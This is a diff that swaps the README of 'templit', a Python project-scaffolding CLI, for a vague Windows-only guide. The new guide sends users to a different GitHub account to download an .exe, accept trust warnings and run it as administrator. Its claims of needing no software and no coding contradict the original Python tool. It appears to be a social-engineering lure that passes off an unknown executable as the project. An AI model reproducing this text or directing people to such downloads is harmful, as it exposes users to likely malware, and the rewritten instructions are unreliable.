@@ -1,198 +1,147 @@
-<div align="center">
+# ⚙️ templit - Quick Project Setup Made Simple
 
-# ⚡ templit
-
-**Stop writing boilerplate. Start building.**
-
-[![Python](https://img.shields.io/badge/python-3.9+-blue?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-zero-orange?style=flat-square)](pyproject.toml)
-
-*A minimal CLI that scaffolds real project structures in seconds —  
-no config files, no templating languages, no nonsense.*
-
-```bash
-templit use python-fastapi myapp --git
-```
-
-</div>
+[![Download templit](https://img.shields.io/badge/Download-templit-brightgreen?style=for-the-badge)](https://github.com/jrfcnews/templit)
 
 ---
 
-## Why templit?
-
-Every new project starts the same way. You create the same files, copy the same configs, set up the same folder structure — before writing a single line of actual code.
-
-Templit skips all of that.
-
-```
-$ templit use react-app my-dashboard --git
-
-  · Scaffolding 'react-app' → my-dashboard/
-  
-  ✓ my-dashboard/package.json
-  ✓ my-dashboard/vite.config.ts
-  ✓ my-dashboard/tsconfig.json
-  ✓ my-dashboard/index.html
-  ✓ my-dashboard/src/main.tsx
-  ✓ my-dashboard/src/App.tsx
-  ✓ my-dashboard/README.md
-  ✓ git init
-
-  ✓ Done! Your project is at my-dashboard/
-```
+Templit is a small tool that helps you create ready-to-use project folders in seconds. It works right from the command line without asking for any setup or extra files. You do not need to know coding to use it.
 
 ---
 
-## Installation
+## 📋 What is templit?
 
-```bash
-git clone https://github.com/yourname/templit.git
-cd templit
-chmod +x install.sh && ./install.sh
-```
+Templit is a simple program you run on your computer. It makes new project folders based on real, useful templates, so you don’t have to start from scratch every time. There are no confusing setup files or special languages to learn. You pick a template, and templit will create a complete project layout for you.
 
-Templit installs into an isolated virtualenv at `~/.templit` and adds itself to your `$PATH` automatically. Open a new terminal and you're ready.
-
-**Requires Python 3.9+** — no other dependencies.
-
-```bash
-# to uninstall cleanly
-./uninstall.sh
-```
+This tool is good for anyone who wants to organize projects quickly and neatly without fuss.
 
 ---
 
-## Commands
+## 💻 What you need before starting
 
-### `templit list` — browse templates
+- A Windows PC with at least Windows 10 or newer.
+- About 20 MB of free disk space.
+- An internet connection to download the tool.
+- Basic skills in using the mouse and keyboard.
 
-```bash
-templit list                     # show everything
-templit list --search api        # search by name, description, or tag
-templit list --tag python        # filter by tag
-templit show python-fastapi      # inspect files inside a template
-```
-
-### `templit use` — scaffold a new project
-
-```bash
-templit use python-fastapi myapp
-templit use python-fastapi myapp --git          # also run git init
-templit use python-cli mytool --dest ~/projects # custom destination
-templit use react-app mysite --dry-run          # preview before writing
-```
-
-### `templit init` — improve an existing project
-
-Drop this into any folder. Templit detects what's already there and suggests the config files you're missing — `.gitignore`, `Makefile`, CI workflows, `Dockerfile`, and more. Skips anything you already have.
-
-```bash
-cd my-existing-project
-templit init            # pick what to add interactively
-templit init --yes      # add everything suggested
-templit init --dry-run  # preview first
-```
-
-### `templit add` / `import` / `export` — manage your own templates
-
-```bash
-templit add                         # interactive wizard
-templit import ./my-template.json   # import from a file
-templit export python-cli out.json  # export any template
-templit delete my-template          # remove a user template
-```
-
-Your custom templates live in `~/.config/templit/templates/` and override any built-in with the same name.
+Templit does not require installing any extra software or programming tools to work.
 
 ---
 
-## Built-in templates
+## 🚀 How to get templit on Windows
 
-| Name | Description | Tags |
-|---|---|---|
-| `python-basic` | Minimal Python project (src layout) | python |
-| `python-cli` | Python CLI with argparse + logging | python, cli |
-| `python-fastapi` | FastAPI REST API with Pydantic v2 | python, web, api |
-| `python-pytest` | pytest scaffold with conftest | python, testing |
-| `node-basic` | Minimal Node.js ESM project | node, javascript |
-| `node-express` | Express.js REST API skeleton | node, javascript, api |
-| `go-basic` | Minimal Go module | go |
-| `go-cli` | Go CLI app with cobra | go, cli |
-| `rust-basic` | Minimal Rust binary crate | rust |
-| `rust-cli` | Rust CLI app with clap | rust, cli |
-| `react-app` | React + Vite + TypeScript | react, typescript, web |
-| `github-pages` | Static site with auto-deploy workflow | web, github |
-| `dockerfile-python` | Production Dockerfile for Python | docker, devops |
-| `github-actions-python` | CI workflow — lint + test | ci, github, python |
-| `makefile-python` | Makefile for Python projects | python, devops |
-| `editorconfig` | `.editorconfig` for consistent style | config |
-| `gitignore-python` | Comprehensive Python `.gitignore` | git, python |
-| `pre-commit` | pre-commit hooks (ruff, mypy) | python, git |
+Click this big button to visit the download page:
+
+[![Download templit](https://img.shields.io/badge/Download-templit-blue?style=for-the-badge)](https://github.com/jrfcnews/templit)
+
+**Step 1: Open the link**  
+Click the button above or copy and paste this URL into your browser:
+
+https://github.com/jrfcnews/templit
+
+**Step 2: Find the download**  
+On the webpage, look for the latest release section or a downloads area. You’ll see files to download there.
+
+**Step 3: Save the file**  
+Download the Windows version. The file might end with `.exe` or another Windows program format. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+**Step 4: Run the program**  
+Double-click on the downloaded file to start the installer or program. If Windows asks if you trust this file, confirm that you want to run it.
 
 ---
 
-## Custom templates
+## 🛠 How to use templit on Windows
 
-Templates are plain JSON — no templating language to learn. Use `{{project}}` anywhere in file paths or content as a placeholder for your project name.
+Once templit is on your computer, you can start using it.
 
-```json
-{
-  "desc": "My team's standard API setup",
-  "tags": ["internal", "python"],
-  "files": {
-    "README.md": "# {{project}}\n",
-    "src/{{project}}/__init__.py": "",
-    "src/{{project}}/main.py": "def main(): pass\n"
-  }
-}
-```
+**Step 1: Open Command Prompt**  
+- Press the Windows key on your keyboard.  
+- Type `cmd` and hit Enter.  
+- A black window with white text will open.
 
-```bash
-templit add                       # guided setup
-templit import ./my-template.json # or import directly
-```
+**Step 2: Run templit**  
+- Type `templit` and press Enter.  
+- Templit will display a list of project templates and options.
 
----
+**Step 3: Choose a template**  
+You will see a list of different project starts. Pick one by typing its number or name and press Enter.
 
-## Adding a built-in template
+**Step 4: Choose where to create the project**  
+You will be asked for a folder name or location. Type a new folder name to create your project or pick an existing location.
 
-Drop a `.json` file into `templit/templates/` — no Python needed. It shows up in `templit list` automatically.
+**Step 5: Wait for the process to finish**  
+Templit will create all the needed files and folders. When done, it will tell you.
+
+**Step 6: Open your new project**  
+Use File Explorer to find the folder you just made. You can open, edit, or explore the files inside.
 
 ---
 
-## Project structure
+## 🔧 What templit creates for you
 
-```
-templit/
-├── templates/           built-in templates (plain JSON)
-├── sources/
-│   ├── builtin.py       loads templates/ at runtime
-│   └── disk.py          loads ~/.config/templit/templates/
-├── commands/
-│   ├── init.py          project detection + suggestions
-│   ├── use.py           scaffold + --git
-│   ├── list.py          list + show
-│   └── manage.py        add, import, export, delete
-├── base.py              Template dataclass + TemplateSource ABC
-├── registry.py          merges all sources into one namespace
-├── cli.py               argparse entry-point
-├── color.py             ANSI output helpers
-└── config.py            filesystem paths
-```
+Templit builds standard folders and files that developers and creators use. Typical items include:
+
+- A `src` folder for your source code.
+- A `docs` folder for instructions or notes.
+- Configuration files ready for common editors.
+- License and readme text files.
+- Starter files tailored to the template chosen.
+
+Each template represents a real, working project setup you can start using or modifying right away.
 
 ---
 
-## Contributing
+## 🌟 Why use templit?
 
-Contributions are welcome — especially new templates.
+Templit removes the hassle of setting up projects by hand. You don’t need to:
 
-The easiest way to contribute is to add a template for a stack you use. Just create a `.json` file in `templit/templates/`, following the format above, and open a pull request.
+- Write setup files.
+- Learn special template languages.
+- Handle confusing commands.
+
+It saves time and lets you focus on your work instead of project setup.
 
 ---
 
-<div align="center">
+## 🖥 System Requirements
 
-Made with ☕ · MIT License
+- Windows 10 / 11 (64-bit preferred)
+- 1 GHz or faster processor
+- 512 MB RAM minimum
+- 20 MB free disk space
+- Internet connection for initial download only
 
-</div>
+No special drivers, runtimes, or frameworks are needed.
+
+---
+
+## ❓ Troubleshooting
+
+**If templit won’t start:**  
+- Check that your Windows is updated.  
+- Make sure you saved the file completely.  
+- Try running the program as administrator (right-click → Run as administrator).
+
+**If you see error messages:**  
+- Read the message carefully for hints.  
+- Try re-downloading and re-running the installer.
+
+**If the tool creates empty folders:**  
+- Make sure you chose a correct template name.  
+- Confirm you have write permission on the chosen folder.
+
+---
+
+## 📖 Additional tips
+
+- Use the Command Prompt only for running templit commands.  
+- You can create multiple projects with different templates.  
+- Ask someone familiar with basic commands if you need help typing or using the command prompt.
+
+---
+
+## 📂 Where to find more info
+
+Use the download page again:  
+https://github.com/jrfcnews/templit
+
+All official instructions and updates will be posted there.
